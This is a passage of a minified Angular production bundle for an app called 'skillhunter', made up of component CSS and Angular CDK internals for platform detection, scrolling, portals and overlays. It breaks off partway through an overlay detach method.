.timeTested--info--text--title[_ngcontent-%COMP%]:nth-child(2){font-size:24px!important;top:65px!important;left:23px!important}.timeTested--info--text[_ngcontent-%COMP%]   .timeTested--info--text--title[_ngcontent-%COMP%]:nth-child(3){font-size:24px!important;top:387px!important;left:98px!important}.timeTested--info--text[_ngcontent-%COMP%]   .timeTested--info--text--title[_ngcontent-%COMP%]:nth-child(4){font-size:24px!important;top:716px!important;left:23px!important}.timeTested--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(1){width:184px!important;height:184px!important;top:166px!important;left:130px!important}.timeTested--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(2){width:184px!important;height:184px!important;top:490px!important;left:0!important}.timeTested--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(3){width:184px!important;height:184px!important;top:819px!important;left:130px!important}.timeTested--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(4){width:32.81px!important;height:32px!important;top:100px!important;left:210px!important}.timeTested--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(5){width:32.81px!important;height:32px!important;top:646px!important;left:210px!important}}.gallery-modal[_ngcontent-%COMP%]{display:flex;justify-content:center;align-items:center;position:fixed;top:0;left:0;width:100%;height:100%;background-color:#000c;z-index:1000;transition:opacity .3s ease}.gallery-modal-content[_ngcontent-%COMP%]{position:relative;padding:20px;border-radius:8px;width:80%;max-width:800px;box-shadow:0 4px 8px #0003}.gallery-modal-content[_ngcontent-%COMP%]   .gallery-navigation[_ngcontent-%COMP%]{display:flex;justify-content:space-between;align-items:center}.gallery-modal-content[_ngcontent-%COMP%]   .gallery-navigation[_ngcontent-%COMP%]   .nav-button[_ngcontent-%COMP%]{width:50px;height:50px;background:none;border:none;font-size:36px;cursor:pointer;border-radius:50%;background:#fff;transition:color .3s ease}.gallery-modal-content[_ngcontent-%COMP%]   .gallery-navigation[_ngcontent-%COMP%]   .nav-button[_ngcontent-%COMP%]:hover{color:#ff8c00}.gallery-modal-content[_ngcontent-%COMP%]   .gallery-images[_ngcontent-%COMP%]{display:flex;justify-content:center;align-items:center;overflow:hidden}.gallery-modal-content[_ngcontent-%COMP%]   .gallery-images[_ngcontent-%COMP%]   .gallery-image[_ngcontent-%COMP%]{max-width:100%;max-height:500px;transition:opacity .5s ease}',
        ],
      })),
      e
    );
  })(),
  ev = (() => {
    let e = class e {
      constructor() {
        this.title = "skillhunter";
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)();
      }),
      (e.ɵcmp = he({
        type: e,
        selectors: [["app-root"]],
        decls: 1,
        vars: 0,
        template: function (r, o) {
          1 & r && B(0, "app-home");
        },
        dependencies: [Jm],
      })),
      e
    );
  })();
function Fr(t, e = 0) {
  return aE(t) ? Number(t) : e;
}
function aE(t) {
  return !isNaN(parseFloat(t)) && !isNaN(Number(t));
}
function vi(t) {
  return Array.isArray(t) ? t : [t];
}
function ae(t) {
  return null == t ? "" : "string" == typeof t ? t : `${t}px`;
}
function St(t) {
  return t instanceof te ? t.nativeElement : t;
}
try {
  Wu = typeof Intl < "u" && Intl.v8BreakIterator;
} catch {
  Wu = !1;
}
var Lr,
  wn,
  zu,
  ge = (() => {
    let e = class e {
      constructor(n) {
        (this._platformId = n),
          (this.isBrowser = this._platformId
            ? lr(this._platformId)
            : "object" == typeof document && !!document),
          (this.EDGE = this.isBrowser && /(edge)/i.test(navigator.userAgent)),
          (this.TRIDENT =
            this.isBrowser && /(msie|trident)/i.test(navigator.userAgent)),
          (this.BLINK =
            this.isBrowser &&
            !(!window.chrome && !Wu) &&
            typeof CSS < "u" &&
            !this.EDGE &&
            !this.TRIDENT),
          (this.WEBKIT =
            this.isBrowser &&
            /AppleWebKit/i.test(navigator.userAgent) &&
            !this.BLINK &&
            !this.EDGE &&
            !this.TRIDENT),
          (this.IOS =
            this.isBrowser &&
            /iPad|iPhone|iPod/.test(navigator.userAgent) &&
            !("MSStream" in window)),
          (this.FIREFOX =
            this.isBrowser && /(firefox|minefield)/i.test(navigator.userAgent)),
          (this.ANDROID =
            this.isBrowser &&
            /android/i.test(navigator.userAgent) &&
            !this.TRIDENT),
          (this.SAFARI =
            this.isBrowser &&
            /safari/i.test(navigator.userAgent) &&
            this.WEBKIT);
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)(h(Me));
      }),
      (e.ɵprov = y({ token: e, factory: e.ɵfac, providedIn: "root" })),
      e
    );
  })();
function cE() {
  if (null == Lr && typeof window < "u")
    try {
      window.addEventListener(
        "test",
        null,
        Object.defineProperty({}, "passive", { get: () => (Lr = !0) })
      );
    } finally {
      Lr = Lr || !1;
    }
  return Lr;
}
function _i(t) {
  return cE() ? t : !!t.capture;
}
function tv() {
  if (null == wn) {
    if (
      "object" != typeof document ||
      !document ||
      "function" != typeof Element ||
      !Element
    )
      return (wn = !1);
    if ("scrollBehavior" in document.documentElement.style) wn = !0;
    else {
      let t = Element.prototype.scrollTo;
      wn = !!t && !/\{\s*\[native code\]\s*\}/.test(t.toString());
    }
  }
  return wn;
}
function lE() {
  if (null == zu) {
    let t = typeof document < "u" ? document.head : null;
    zu = !(!t || (!t.createShadowRoot && !t.attachShadow));
  }
  return zu;
}
function nv(t) {
  if (lE()) {
    let e = t.getRootNode ? t.getRootNode() : null;
    if (typeof ShadowRoot < "u" && ShadowRoot && e instanceof ShadowRoot)
      return e;
  }
  return null;
}
function jr() {
  let t = typeof document < "u" && document ? document.activeElement : null;
  for (; t && t.shadowRoot; ) {
    let e = t.shadowRoot.activeElement;
    if (e === t) break;
    t = e;
  }
  return t;
}
function nt(t) {
  return t.composedPath ? t.composedPath()[0] : t.target;
}
function Vr() {
  return (
    (typeof __karma__ < "u" && !!__karma__) ||
    (typeof jasmine < "u" && !!jasmine) ||
    (typeof jest < "u" && !!jest) ||
    (typeof Mocha < "u" && !!Mocha)
  );
}
var uE = new b("cdk-dir-doc", { providedIn: "root", factory: dE });
function dE() {
  return v(T);
}
var fE =
  /^(ar|ckb|dv|he|iw|fa|nqo|ps|sd|ug|ur|yi|.*[-_](Adlm|Arab|Hebr|Nkoo|Rohg|Thaa))(?!.*[-_](Latn|Cyrl)($|-|_))($|-|_)/i;
function hE(t) {
  let e = t?.toLowerCase() || "";
  return "auto" === e && typeof navigator < "u" && navigator?.language
    ? fE.test(navigator.language)
      ? "rtl"
      : "ltr"
    : "rtl" === e
    ? "rtl"
    : "ltr";
}
var Br = (() => {
    let e = class e {
      constructor(n) {
        if (((this.value = "ltr"), (this.change = new K()), n)) {
          let r = n.body ? n.body.dir : null,
            o = n.documentElement ? n.documentElement.dir : null;
          this.value = hE(r || o || "ltr");
        }
      }
      ngOnDestroy() {
        this.change.complete();
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)(h(uE, 8));
      }),
      (e.ɵprov = y({ token: e, factory: e.ɵfac, providedIn: "root" })),
      e
    );
  })(),
  en = (() => {
    let e = class e {};
    return (
      (e.ɵfac = function (r) {
        return new (r || e)();
      }),
      (e.ɵmod = $({ type: e })),
      (e.ɵinj = U({})),
      e
    );
  })(),
  vE = 20,
  rv = (() => {
    let e = class e {
      constructor(n, r, o) {
        (this._ngZone = n),
          (this._platform = r),
          (this._scrolled = new N()),
          (this._globalSubscription = null),
          (this._scrolledCount = 0),
          (this.scrollContainers = new Map()),
          (this._document = o);
      }
      register(n) {
        this.scrollContainers.has(n) ||
          this.scrollContainers.set(
            n,
            n.elementScrolled().subscribe(() => this._scrolled.next(n))
          );
      }
      deregister(n) {
        let r = this.scrollContainers.get(n);
        r && (r.unsubscribe(), this.scrollContainers.delete(n));
      }
      scrolled(n = vE) {
        return this._platform.isBrowser
          ? new L((r) => {
              this._globalSubscription || this._addGlobalListener();
              let o =
                n > 0
                  ? this._scrolled.pipe(Co(n)).subscribe(r)
                  : this._scrolled.subscribe(r);
              return (
                this._scrolledCount++,
                () => {
                  o.unsubscribe(),
                    this._scrolledCount--,
                    this._scrolledCount || this._removeGlobalListener();
                }
              );
            })
          : x();
      }
      ngOnDestroy() {
        this._removeGlobalListener(),
          this.scrollContainers.forEach((n, r) => this.deregister(r)),
          this._scrolled.complete();
      }
      ancestorScrolled(n, r) {
        let o = this.getAncestorScrollContainers(n);
        return this.scrolled(r).pipe(Q((s) => !s || o.indexOf(s) > -1));
      }
      getAncestorScrollContainers(n) {
        let r = [];
        return (
          this.scrollContainers.forEach((o, s) => {
            this._scrollableContainsElement(s, n) && r.push(s);
          }),
          r
        );
      }
      _getWindow() {
        return this._document.defaultView || window;
      }
      _scrollableContainsElement(n, r) {
        let o = St(r),
          s = n.getElementRef().nativeElement;
        do {
          if (o == s) return !0;
        } while ((o = o.parentElement));
        return !1;
      }
      _addGlobalListener() {
        this._globalSubscription = this._ngZone.runOutsideAngular(() =>
          Oi(this._getWindow().document, "scroll").subscribe(() =>
            this._scrolled.next()
          )
        );
      }
      _removeGlobalListener() {
        this._globalSubscription &&
          (this._globalSubscription.unsubscribe(),
          (this._globalSubscription = null));
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)(h(O), h(ge), h(T, 8));
      }),
      (e.ɵprov = y({ token: e, factory: e.ɵfac, providedIn: "root" })),
      e
    );
  })(),
  _E = 20,
  qu = (() => {
    let e = class e {
      constructor(n, r, o) {
        (this._platform = n),
          (this._change = new N()),
          (this._changeListener = (s) => {
            this._change.next(s);
          }),
          (this._document = o),
          r.runOutsideAngular(() => {
            if (n.isBrowser) {
              let s = this._getWindow();
              s.addEventListener("resize", this._changeListener),
                s.addEventListener("orientationchange", this._changeListener);
            }
            this.change().subscribe(() => (this._viewportSize = null));
          });
      }
      ngOnDestroy() {
        if (this._platform.isBrowser) {
          let n = this._getWindow();
          n.removeEventListener("resize", this._changeListener),
            n.removeEventListener("orientationchange", this._changeListener);
        }
        this._change.complete();
      }
      getViewportSize() {
        this._viewportSize || this._updateViewportSize();
        let n = {
          width: this._viewportSize.width,
          height: this._viewportSize.height,
        };
        return this._platform.isBrowser || (this._viewportSize = null), n;
      }
      getViewportRect() {
        let n = this.getViewportScrollPosition(),
          { width: r, height: o } = this.getViewportSize();
        return {
          top: n.top,
          left: n.left,
          bottom: n.top + o,
          right: n.left + r,
          height: o,
          width: r,
        };
      }
      getViewportScrollPosition() {
        if (!this._platform.isBrowser) return { top: 0, left: 0 };
        let n = this._document,
          r = this._getWindow(),
          o = n.documentElement,
          s = o.getBoundingClientRect();
        return {
          top: -s.top || n.body.scrollTop || r.scrollY || o.scrollTop || 0,
          left: -s.left || n.body.scrollLeft || r.scrollX || o.scrollLeft || 0,
        };
      }
      change(n = _E) {
        return n > 0 ? this._change.pipe(Co(n)) : this._change;
      }
      _getWindow() {
        return this._document.defaultView || window;
      }
      _updateViewportSize() {
        let n = this._getWindow();
        this._viewportSize = this._platform.isBrowser
          ? { width: n.innerWidth, height: n.innerHeight }
          : { width: 0, height: 0 };
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)(h(ge), h(O), h(T, 8));
      }),
      (e.ɵprov = y({ token: e, factory: e.ɵfac, providedIn: "root" })),
      e
    );
  })(),
  iv = (() => {
    let e = class e {};
    return (
      (e.ɵfac = function (r) {
        return new (r || e)();
      }),
      (e.ɵmod = $({ type: e })),
      (e.ɵinj = U({})),
      e
    );
  })(),
  Yu = (() => {
    let e = class e {};
    return (
      (e.ɵfac = function (r) {
        return new (r || e)();
      }),
      (e.ɵmod = $({ type: e })),
      (e.ɵinj = U({ imports: [en, iv, en, iv] })),
      e
    );
  })(),
  Ur = class {
    attach(e) {
      return (this._attachedHost = e), e.attach(this);
    }
    detach() {
      let e = this._attachedHost;
      null != e && ((this._attachedHost = null), e.detach());
    }
    get isAttached() {
      return null != this._attachedHost;
    }
    setAttachedHost(e) {
      this._attachedHost = e;
    }
  },
  yi = class extends Ur {
    constructor(e, i, n, r, o) {
      super(),
        (this.component = e),
        (this.viewContainerRef = i),
        (this.injector = n),
        (this.componentFactoryResolver = r),
        (this.projectableNodes = o);
    }
  },
  Ci = class extends Ur {
    constructor(e, i, n, r) {
      super(),
        (this.templateRef = e),
        (this.viewContainerRef = i),
        (this.context = n),
        (this.injector = r);
    }
    get origin() {
      return this.templateRef.elementRef;
    }
    attach(e, i = this.context) {
      return (this.context = i), super.attach(e);
    }
    detach() {
      return (this.context = void 0), super.detach();
    }
  },
  Zu = class extends Ur {
    constructor(e) {
      super(), (this.element = e instanceof te ? e.nativeElement : e);
    }
  },
  wi = class {
    constructor() {
      (this._isDisposed = !1), (this.attachDomPortal = null);
    }
    hasAttached() {
      return !!this._attachedPortal;
    }
    attach(e) {
      return e instanceof yi
        ? ((this._attachedPortal = e), this.attachComponentPortal(e))
        : e instanceof Ci
        ? ((this._attachedPortal = e), this.attachTemplatePortal(e))
        : this.attachDomPortal && e instanceof Zu
        ? ((this._attachedPortal = e), this.attachDomPortal(e))
        : void 0;
    }
    detach() {
      this._attachedPortal &&
        (this._attachedPortal.setAttachedHost(null),
        (this._attachedPortal = null)),
        this._invokeDisposeFn();
    }
    dispose() {
      this.hasAttached() && this.detach(),
        this._invokeDisposeFn(),
        (this._isDisposed = !0);
    }
    setDisposeFn(e) {
      this._disposeFn = e;
    }
    _invokeDisposeFn() {
      this._disposeFn && (this._disposeFn(), (this._disposeFn = null));
    }
  },
  fa = class extends wi {
    constructor(e, i, n, r, o) {
      super(),
        (this.outletElement = e),
        (this._componentFactoryResolver = i),
        (this._appRef = n),
        (this._defaultInjector = r),
        (this.attachDomPortal = (s) => {
          this._document;
          let a = s.element;
          a.parentNode;
          let c = this._document.createComment("dom-portal");
          a.parentNode.insertBefore(c, a),
            this.outletElement.appendChild(a),
            (this._attachedPortal = s),
            super.setDisposeFn(() => {
              c.parentNode && c.parentNode.replaceChild(a, c);
            });
        }),
        (this._document = o);
    }
    attachComponentPortal(e) {
      let r,
        n = (
          e.componentFactoryResolver || this._componentFactoryResolver
        ).resolveComponentFactory(e.component);
      return (
        e.viewContainerRef
          ? ((r = e.viewContainerRef.createComponent(
              n,
              e.viewContainerRef.length,
              e.injector || e.viewContainerRef.injector,
              e.projectableNodes || void 0
            )),
            this.setDisposeFn(() => r.destroy()))
          : ((r = n.create(e.injector || this._defaultInjector || re.NULL)),
            this._appRef.attachView(r.hostView),
            this.setDisposeFn(() => {
              this._appRef.viewCount > 0 && this._appRef.detachView(r.hostView),
                r.destroy();
            })),
        this.outletElement.appendChild(this._getComponentRootNode(r)),
        (this._attachedPortal = e),
        r
      );
    }
    attachTemplatePortal(e) {
      let i = e.viewContainerRef,
        n = i.createEmbeddedView(e.templateRef, e.context, {
          injector: e.injector,
        });
      return (
        n.rootNodes.forEach((r) => this.outletElement.appendChild(r)),
        n.detectChanges(),
        this.setDisposeFn(() => {
          let r = i.indexOf(n);
          -1 !== r && i.remove(r);
        }),
        (this._attachedPortal = e),
        n
      );
    }
    dispose() {
      super.dispose(), this.outletElement.remove();
    }
    _getComponentRootNode(e) {
      return e.hostView.rootNodes[0];
    }
  },
  $r = (() => {
    let e = class e extends wi {
      constructor(n, r, o) {
        super(),
          (this._componentFactoryResolver = n),
          (this._viewContainerRef = r),
          (this._isInitialized = !1),
          (this.attached = new K()),
          (this.attachDomPortal = (s) => {
            this._document;
            let a = s.element;
            a.parentNode;
            let c = this._document.createComment("dom-portal");
            s.setAttachedHost(this),
              a.parentNode.insertBefore(c, a),
              this._getRootNode().appendChild(a),
              (this._attachedPortal = s),
              super.setDisposeFn(() => {
                c.parentNode && c.parentNode.replaceChild(a, c);
              });
          }),
          (this._document = o);
      }
      get portal() {
        return this._attachedPortal;
      }
      set portal(n) {
        (this.hasAttached() && !n && !this._isInitialized) ||
          (this.hasAttached() && super.detach(),
          n && super.attach(n),
          (this._attachedPortal = n || null));
      }
      get attachedRef() {
        return this._attachedRef;
      }
      ngOnInit() {
        this._isInitialized = !0;
      }
      ngOnDestroy() {
        super.dispose(), (this._attachedRef = this._attachedPortal = null);
      }
      attachComponentPortal(n) {
        n.setAttachedHost(this);
        let r =
            null != n.viewContainerRef
              ? n.viewContainerRef
              : this._viewContainerRef,
          s = (
            n.componentFactoryResolver || this._componentFactoryResolver
          ).resolveComponentFactory(n.component),
          a = r.createComponent(
            s,
            r.length,
            n.injector || r.injector,
            n.projectableNodes || void 0
          );
        return (
          r !== this._viewContainerRef &&
            this._getRootNode().appendChild(a.hostView.rootNodes[0]),
          super.setDisposeFn(() => a.destroy()),
          (this._attachedPortal = n),
          (this._attachedRef = a),
          this.attached.emit(a),
          a
        );
      }
      attachTemplatePortal(n) {
        n.setAttachedHost(this);
        let r = this._viewContainerRef.createEmbeddedView(
          n.templateRef,
          n.context,
          { injector: n.injector }
        );
        return (
          super.setDisposeFn(() => this._viewContainerRef.clear()),
          (this._attachedPortal = n),
          (this._attachedRef = r),
          this.attached.emit(r),
          r
        );
      }
      _getRootNode() {
        let n = this._viewContainerRef.element.nativeElement;
        return n.nodeType === n.ELEMENT_NODE ? n : n.parentNode;
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)(P(Ht), P(Ue), P(T));
      }),
      (e.ɵdir = be({
        type: e,
        selectors: [["", "cdkPortalOutlet", ""]],
        inputs: { portal: [de.None, "cdkPortalOutlet", "portal"] },
        outputs: { attached: "attached" },
        exportAs: ["cdkPortalOutlet"],
        standalone: !0,
        features: [zt],
      })),
      e
    );
  })(),
  bn = (() => {
    let e = class e {};
    return (
      (e.ɵfac = function (r) {
        return new (r || e)();
      }),
      (e.ɵmod = $({ type: e })),
      (e.ɵinj = U({})),
      e
    );
  })();
function ha(t, ...e) {
  return e.length
    ? e.some((i) => t[i])
    : t.altKey || t.shiftKey || t.ctrlKey || t.metaKey;
}
var ov = tv(),
  Qu = class {
    constructor(e, i) {
      (this._viewportRuler = e),
        (this._previousHTMLStyles = { top: "", left: "" }),
        (this._isEnabled = !1),
        (this._document = i);
    }
    attach() {}
    enable() {
      if (this._canBeEnabled()) {
        let e = this._document.documentElement;
        (this._previousScrollPosition =
          this._viewportRuler.getViewportScrollPosition()),
          (this._previousHTMLStyles.left = e.style.left || ""),
          (this._previousHTMLStyles.top = e.style.top || ""),
          (e.style.left = ae(-this._previousScrollPosition.left)),
          (e.style.top = ae(-this._previousScrollPosition.top)),
          e.classList.add("cdk-global-scrollblock"),
          (this._isEnabled = !0);
      }
    }
    disable() {
      if (this._isEnabled) {
        let e = this._document.documentElement,
          i = this._document.body,
          n = e.style,
          r = i.style,
          o = n.scrollBehavior || "",
          s = r.scrollBehavior || "";
        (this._isEnabled = !1),
          (n.left = this._previousHTMLStyles.left),
          (n.top = this._previousHTMLStyles.top),
          e.classList.remove("cdk-global-scrollblock"),
          ov && (n.scrollBehavior = r.scrollBehavior = "auto"),
          window.scroll(
            this._previousScrollPosition.left,
            this._previousScrollPosition.top
          ),
          ov && ((n.scrollBehavior = o), (r.scrollBehavior = s));
      }
    }
    _canBeEnabled() {
      if (
        this._document.documentElement.classList.contains(
          "cdk-global-scrollblock"
        ) ||
        this._isEnabled
      )
        return !1;
      let i = this._document.body,
        n = this._viewportRuler.getViewportSize();
      return i.scrollHeight > n.height || i.scrollWidth > n.width;
    }
  },
  Ku = class {
    constructor(e, i, n, r) {
      (this._scrollDispatcher = e),
        (this._ngZone = i),
        (this._viewportRuler = n),
        (this._config = r),
        (this._scrollSubscription = null),
        (this._detach = () => {
          this.disable(),
            this._overlayRef.hasAttached() &&
              this._ngZone.run(() => this._overlayRef.detach());
        });
    }
    attach(e) {
      this._overlayRef, (this._overlayRef = e);
    }
    enable() {
      if (this._scrollSubscription) return;
      let e = this._scrollDispatcher
        .scrolled(0)
        .pipe(
          Q(
            (i) =>
              !i ||
              !this._overlayRef.overlayElement.contains(
                i.getElementRef().nativeElement
              )
          )
        );
      this._config && this._config.threshold && this._config.threshold > 1
        ? ((this._initialScrollPosition =
            this._viewportRuler.getViewportScrollPosition().top),
          (this._scrollSubscription = e.subscribe(() => {
            let i = this._viewportRuler.getViewportScrollPosition().top;
            Math.abs(i - this._initialScrollPosition) > this._config.threshold
              ? this._detach()
              : this._overlayRef.updatePosition();
          })))
        : (this._scrollSubscription = e.subscribe(this._detach));
    }
    disable() {
      this._scrollSubscription &&
        (this._scrollSubscription.unsubscribe(),
        (this._scrollSubscription = null));
    }
    detach() {
      this.disable(), (this._overlayRef = null);
    }
  },
  pa = class {
    enable() {}
    disable() {}
    attach() {}
  };
function Xu(t, e) {
  return e.some((i) => {
    let n = t.bottom < i.top,
      r = t.top > i.bottom,
      o = t.right < i.left,
      s = t.left > i.right;
    return n || r || o || s;
  });
}
function sv(t, e) {
  return e.some((i) => {
    let n = t.top < i.top,
      r = t.bottom > i.bottom,
      o = t.left < i.left,
      s = t.right > i.right;
    return n || r || o || s;
  });
}
var Ju = class {
    constructor(e, i, n, r) {
      (this._scrollDispatcher = e),
        (this._viewportRuler = i),
        (this._ngZone = n),
        (this._config = r),
        (this._scrollSubscription = null);
    }
    attach(e) {
      this._overlayRef, (this._overlayRef = e);
    }
    enable() {
      if (!this._scrollSubscription) {
        let e = this._config ? this._config.scrollThrottle : 0;
        this._scrollSubscription = this._scrollDispatcher
          .scrolled(e)
          .subscribe(() => {
            if (
              (this._overlayRef.updatePosition(),
              this._config && this._config.autoClose)
            ) {
              let i = this._overlayRef.overlayElement.getBoundingClientRect(),
                { width: n, height: r } = this._viewportRuler.getViewportSize();
              Xu(i, [
                { width: n, height: r, bottom: r, right: n, top: 0, left: 0 },
              ]) &&
                (this.disable(),
                this._ngZone.run(() => this._overlayRef.detach()));
            }
          });
      }
    }
    disable() {
      this._scrollSubscription &&
        (this._scrollSubscription.unsubscribe(),
        (this._scrollSubscription = null));
    }
    detach() {
      this.disable(), (this._overlayRef = null);
    }
  },
  CE = (() => {
    let e = class e {
      constructor(n, r, o, s) {
        (this._scrollDispatcher = n),
          (this._viewportRuler = r),
          (this._ngZone = o),
          (this.noop = () => new pa()),
          (this.close = (a) =>
            new Ku(
              this._scrollDispatcher,
              this._ngZone,
              this._viewportRuler,
              a
            )),
          (this.block = () => new Qu(this._viewportRuler, this._document)),
          (this.reposition = (a) =>
            new Ju(
              this._scrollDispatcher,
              this._viewportRuler,
              this._ngZone,
              a
            )),
          (this._document = s);
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)(h(rv), h(qu), h(O), h(T));
      }),
      (e.ɵprov = y({ token: e, factory: e.ɵfac, providedIn: "root" })),
      e
    );
  })(),
  Hr = class {
    constructor(e) {
      if (
        ((this.scrollStrategy = new pa()),
        (this.panelClass = ""),
        (this.hasBackdrop = !1),
        (this.backdropClass = "cdk-overlay-dark-backdrop"),
        (this.disposeOnNavigation = !1),
        e)
      ) {
        let i = Object.keys(e);
        for (let n of i) void 0 !== e[n] && (this[n] = e[n]);
      }
    }
  },
  ed = class {
    constructor(e, i) {
      (this.connectionPair = e), (this.scrollableViewProperties = i);
    }
  },
  dv = (() => {
    let e = class e {
      constructor(n) {
        (this._attachedOverlays = []), (this._document = n);
      }
      ngOnDestroy() {
        this.detach();
      }
      add(n) {
        this.remove(n), this._attachedOverlays.push(n);
      }
      remove(n) {
        let r = this._attachedOverlays.indexOf(n);
        r > -1 && this._attachedOverlays.splice(r, 1),
          0 === this._attachedOverlays.length && this.detach();
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)(h(T));
      }),
      (e.ɵprov = y({ token: e, factory: e.ɵfac, providedIn: "root" })),
      e
    );
  })(),
  wE = (() => {
    let e = class e extends dv {
      constructor(n, r) {
        super(n),
          (this._ngZone = r),
          (this._keydownListener = (o) => {
            let s = this._attachedOverlays;
            for (let a = s.length - 1; a > -1; a--)
              if (s[a]._keydownEvents.observers.length > 0) {
                let c = s[a]._keydownEvents;
                this._ngZone ? this._ngZone.run(() => c.next(o)) : c.next(o);
                break;
              }
          });
      }
      add(n) {
        super.add(n),
          this._isAttached ||
            (this._ngZone
              ? this._ngZone.runOutsideAngular(() =>
                  this._document.body.addEventListener(
                    "keydown",
                    this._keydownListener
                  )
                )
              : this._document.body.addEventListener(
                  "keydown",
                  this._keydownListener
                ),
            (this._isAttached = !0));
      }
      detach() {
        this._isAttached &&
          (this._document.body.removeEventListener(
            "keydown",
            this._keydownListener
          ),
          (this._isAttached = !1));
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)(h(T), h(O, 8));
      }),
      (e.ɵprov = y({ token: e, factory: e.ɵfac, providedIn: "root" })),
      e
    );
  })(),
  bE = (() => {
    let e = class e extends dv {
      constructor(n, r, o) {
        super(n),
          (this._platform = r),
          (this._ngZone = o),
          (this._cursorStyleIsSet = !1),
          (this._pointerDownListener = (s) => {
            this._pointerDownEventTarget = nt(s);
          }),
          (this._clickListener = (s) => {
            let a = nt(s),
              c =
                "click" === s.type && this._pointerDownEventTarget
                  ? this._pointerDownEventTarget
                  : a;
            this._pointerDownEventTarget = null;
            let l = this._attachedOverlays.slice();
            for (let u = l.length - 1; u > -1; u--) {
              let d = l[u];
              if (
                d._outsidePointerEvents.observers.length < 1 ||
                !d.hasAttached()
              )
                continue;
              if (d.overlayElement.contains(a) || d.overlayElement.contains(c))
                break;
              let f = d._outsidePointerEvents;
              this._ngZone ? this._ngZone.run(() => f.next(s)) : f.next(s);
            }
          });
      }
      add(n) {
        if ((super.add(n), !this._isAttached)) {
          let r = this._document.body;
          this._ngZone
            ? this._ngZone.runOutsideAngular(() => this._addEventListeners(r))
            : this._addEventListeners(r),
            this._platform.IOS &&
              !this._cursorStyleIsSet &&
              ((this._cursorOriginalValue = r.style.cursor),
              (r.style.cursor = "pointer"),
              (this._cursorStyleIsSet = !0)),
            (this._isAttached = !0);
        }
      }
      detach() {
        if (this._isAttached) {
          let n = this._document.body;
          n.removeEventListener("pointerdown", this._pointerDownListener, !0),
            n.removeEventListener("click", this._clickListener, !0),
            n.removeEventListener("auxclick", this._clickListener, !0),
            n.removeEventListener("contextmenu", this._clickListener, !0),
            this._platform.IOS &&
              this._cursorStyleIsSet &&
              ((n.style.cursor = this._cursorOriginalValue),
              (this._cursorStyleIsSet = !1)),
            (this._isAttached = !1);
        }
      }
      _addEventListeners(n) {
        n.addEventListener("pointerdown", this._pointerDownListener, !0),
          n.addEventListener("click", this._clickListener, !0),
          n.addEventListener("auxclick", this._clickListener, !0),
          n.addEventListener("contextmenu", this._clickListener, !0);
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)(h(T), h(ge), h(O, 8));
      }),
      (e.ɵprov = y({ token: e, factory: e.ɵfac, providedIn: "root" })),
      e
    );
  })(),
  bi = (() => {
    let e = class e {
      constructor(n, r) {
        (this._platform = r), (this._document = n);
      }
      ngOnDestroy() {
        this._containerElement?.remove();
      }
      getContainerElement() {
        return (
          this._containerElement || this._createContainer(),
          this._containerElement
        );
      }
      _createContainer() {
        let n = "cdk-overlay-container";
        if (this._platform.isBrowser || Vr()) {
          let o = this._document.querySelectorAll(
            `.${n}[platform="server"], .${n}[platform="test"]`
          );
          for (let s = 0; s < o.length; s++) o[s].remove();
        }
        let r = this._document.createElement("div");
        r.classList.add(n),
          Vr()
            ? r.setAttribute("platform", "test")
            : this._platform.isBrowser || r.setAttribute("platform", "server"),
          this._document.body.appendChild(r),
          (this._containerElement = r);
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)(h(T), h(ge));
      }),
      (e.ɵprov = y({ token: e, factory: e.ɵfac, providedIn: "root" })),
      e
    );
  })(),
  Tt = class {
    constructor(e, i, n, r, o, s, a, c, l, u = !1) {
      (this._portalOutlet = e),
        (this._host = i),
        (this._pane = n),
        (this._config = r),
        (this._ngZone = o),
        (this._keyboardDispatcher = s),
        (this._document = a),
        (this._location = c),
        (this._outsideClickDispatcher = l),
        (this._animationsDisabled = u),
        (this._backdropElement = null),
        (this._backdropClick = new N()),
        (this._attachments = new N()),
        (this._detachments = new N()),
        (this._locationChanges = Y.EMPTY),
        (this._backdropClickHandler = (d) => this._backdropClick.next(d)),
        (this._backdropTransitionendHandler = (d) => {
          this._disposeBackdrop(d.target);
        }),
        (this._keydownEvents = new N()),
        (this._outsidePointerEvents = new N()),
        r.scrollStrategy &&
          ((this._scrollStrategy = r.scrollStrategy),
          this._scrollStrategy.attach(this)),
        (this._positionStrategy = r.positionStrategy);
    }
    get overlayElement() {
      return this._pane;
    }
    get backdropElement() {
      return this._backdropElement;
    }
    get hostElement() {
      return this._host;
    }
    attach(e) {
      !this._host.parentElement &&
        this._previousHostParent &&
        this._previousHostParent.appendChild(this._host);
      let i = this._portalOutlet.attach(e);
      return (
        this._positionStrategy && this._positionStrategy.attach(this),
        this._updateStackingOrder(),
        this._updateElementSize(),
        this._updateElementDirection(),
        this._scrollStrategy && this._scrollStrategy.enable(),
        this._ngZone.onStable.pipe(ue(1)).subscribe(() => {
          this.hasAttached() && this.updatePosition();
        }),
        this._togglePointerEvents(!0),
        this._config.hasBackdrop && this._attachBackdrop(),
        this._config.panelClass &&
          this._toggleClasses(this._pane, this._config.panelClass, !0),
        this._attachments.next(),
        this._keyboardDispatcher.add(this),
        this._config.disposeOnNavigation &&
          (this._locationChanges = this._location.subscribe(() =>
            this.dispose()
          )),
        this._outsideClickDispatcher.add(this),
        "function" == typeof i?.onDestroy &&
          i.onDestroy(() => {
            this.hasAttached() &&
              this._ngZone.runOutsideAngular(() =>
                Promise.resolve().then(() => this.detach())
              );
          }),
        i
      );
    }
    detach() {
      if (!this.hasAttached()) return;
      this.detachBackdrop(),
        this._togglePointerEvents(!1),
        this._positionStrategy &&
          this._positionStrategy.detach &&
          this._positionStrategy.detach(),
        this._scrollStrategy && this._scrollStrategy.disable();
